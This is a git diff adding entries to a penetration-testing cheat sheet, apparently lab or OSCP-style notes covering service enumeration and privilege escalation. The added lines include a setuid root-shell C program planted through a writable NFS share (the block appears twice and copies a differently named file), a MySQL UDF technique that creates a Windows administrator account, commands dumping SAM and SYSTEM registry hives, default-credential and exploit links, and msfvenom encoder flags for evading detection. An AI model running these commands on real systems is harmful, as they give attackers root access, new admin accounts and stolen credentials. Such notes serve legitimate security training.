@@ -51,6 +51,11 @@ $ ls -l /usr/share/nmap/scripts/*ssh*
 $ nmap -v -p 139,445 --script=smb-vuln-ms17-010.nse --script-args=unsafe=1 10.11.1.31
 ```
 
+OS Fingerprinting:
+```bash
+$ xprobe2 -v -p tcp:80:open 192.168.6.66
+```
+
 Kali Apache server not working properly? Try use:
 `$ python -m SimpleHTTPServer 8080`
 
@@ -96,6 +101,9 @@ ftp> get ../\../\../\../\boot.ini
 226 File sent ok
 ftp> dir ../\../\../\temp/
 ```
+
+CompleteFTP Server - Directory Traversal
+* https://www.exploit-db.com/exploits/11973
 
 ProFTPD 1.3.3a
 * (Worked) https://github.com/Muhammd/ProFTPD-1.3.3a/blob/master/ProFTPD_exploit.py
@@ -195,12 +203,35 @@ $ telnet [target]
 ### Remote Procedure Call - TCP 111
 
 Exploit NFS shares
-```
+```bash
 $ rpcinfo -p [ target IP ] | grep 'nfs'
 $ rpcbind -p [ target IP ]                        # Look for NFS-shares
 $ showmount -e [ target IP ]                      # show mountable directories
 $ mount -t nfs [target IP]:/ /mnt -o nolock       # mount remote share to your local machine
 $ df -k                                           # show mounted file systems
+```
+
+Exploit NFS shares for privesc:
+```bash
+$ showmount -e 192.168.xx.53
+Export list for 192.168.xx.53:
+/shared 192.168.xx.0/255.255.255.0
+$ mkdir /tmp/mymount
+/bin/mkdir: created directory '/tmp/mymount'
+$ mount -t nfs 192.168.xx.53:/shared /tmp/mymount -o nolock
+$ cat /root/Desktop/exploit.c
+#include <stdio.h>
+#include <unistd.h>
+int main(void)
+{
+setuid(0);
+setgid(0);
+system("/bin/bash");
+}
+gcc exploit.c -m32 -o exploit
+
+$ cp /root/Desktop/x /tmp/mymount/
+$ chmod u+s exploit
 ```
 
 Attack scenario: replace target SSH keys with your own
@@ -323,7 +354,8 @@ Samba Symlink Directory Traversal (Samba 3.0.x)
 
 SNMP is an app-layer protocol for collecting and managing information about devices within a network.  
 
-SNMP enumeration:
+SNMP enumeration:  
+(find further info about devices/software with vulns to gain a shell)
 ```
 $ snmpwalk -c [community string] -v1 [ target ]
 $ onesixtyone [ target ] -c community.txt
@@ -370,6 +402,11 @@ msf> use auxiliary/admin/mssql/mssql_enum       # post-exploit enum
 msf> use auxiliary/admin/mssql/mssql_exec       # if 'xp_cmdshell' is enabled, execute system commands
 ```
 
+MSSQL Server - default credentials:
+* http://support.webecs.com/kb/a867/what-is-the-default-password-for-the-sa-login.aspx
+* https://support.microsoft.com/en-au/help/321081/installation-of-msde-creates-an-sa-account-with-a-blank-password-in-vi
+
+
 ### Oracle SQL Database Listener - TCP 1521
 
 Look at notes from pwning `10.11.1.202`.
@@ -391,6 +428,17 @@ $ mysql -u root -p
 Drop to a shell (as the user running MySQL):
 ```
 mysql> \! /bin/bash
+```
+
+MySQL root to system-root for windows/linux - https://www.adampalmer.me/iodigitalsec/2013/08/13/mysql-root-to-system-root-with-udf-for-windows-and-linux/: 
+```bash
+$ USE mysql;
+$ CREATE TABLE mytbl(line blob);
+$ INSERT INTO mytbl values(load_file('C://xampplite//htdocs //lib_mysqludf_sys.dll'));
+$ SELECT * FROM mysql.mytbl INTO DUMPFILE 'c://windows//system32//lib_mysqludf_sys_32.dll';
+$ CREATE FUNCTION sys_exec RETURNS integer SONAME 'lib_mysqludf_sys_32.dll';
+$ SELECT sys_exec("net user testu P@ssw0rd /add");
+$ SELECT sys_exec("net localgroup Administrators testu /add");
 ```
 
 ### RDP - TCP 3389
@@ -623,6 +671,35 @@ Localhost listening ports:
 $ netstat -alntp
 ```
 
+Exploit NFS shares for privesc (check `cat /etc/exports`):  
+(/etc/exports is table of local physical file systems on an NFS server that are accessible to NFS clients)
+```bash
+$ showmount -e 192.168.xx.53                               # check for writable shares
+Export list for 192.168.xx.53:
+/shared 192.168.xx.0/255.255.255.0
+$ mkdir /tmp/mymount
+/bin/mkdir: created directory '/tmp/mymount'
+$ mount -t nfs 192.168.xx.53:/shared /tmp/mymount -o nolock # mount share
+$ cat /root/Desktop/exploit.c
+#include <stdio.h>
+#include <unistd.h>
+int main(void)
+{
+setuid(0);
+setgid(0);
+system("/bin/bash");
+}
+gcc exploit.c -m32 -o exploit
+
+$ cp /root/Desktop/x /tmp/mymount/
+$ chmod u+s exploit
+```
+
+/etc/fstab  (check `cat /etc/fstab`):
+* Look for un-mounted file-systems
+* Look for file-systems with vulnerabilities e.g. ReiserFS privesc
+
+
 UDEV
 * Guide: http://www.madirish.net/370
 * Exploit Code: https://www.exploit-db.com/exploits/8478
@@ -681,11 +758,18 @@ Find Running Services:
 $ sc query state=all
 ```
 
-Dump passwords:
+Dump passwords / hardcoded credentials:
 ```powershell
+# Password hashes
 $ reg.exe save hklm\sam c:\sam_backup
 $ reg.exe save hklm\security c:\security_backup
 $ reg.exe save hklm\system c:\system
+
+# User password
+$ type C:\Users\[username]\NTUSER.dat
+
+# WebDAV passwords
+$ /xampp/security/webdav.htpasswd
 ```
     
 Cached Credentials:
@@ -787,14 +871,18 @@ http://carnal0wnage.attackresearch.com/2017/08/certutil-for-delivery-of-files.ht
 # Powershell method
 $ impacket-smbserver files `pwd`            # @KALI: Set up a SMB server with files=share `pwd`=workingdir.
 PS> xcopy \\10.10.14.3\files\rshell.exe .   # @TARGET: Copy rshell.exe from remote share to current dir.
-
-
 ```
 
 # MSFVENOM PAYLOADS
 
 Msfvenom commands:
 * https://netsec.ws/?p=331
+
+Encoders:
+```bash
+$ [msfvenom commands] -e x86/shikata_ga_nai
+$ [msfvenom commands] -e x86/alpha_mixed
+``
 
 # COMPILING EXPLOIT CODE
 
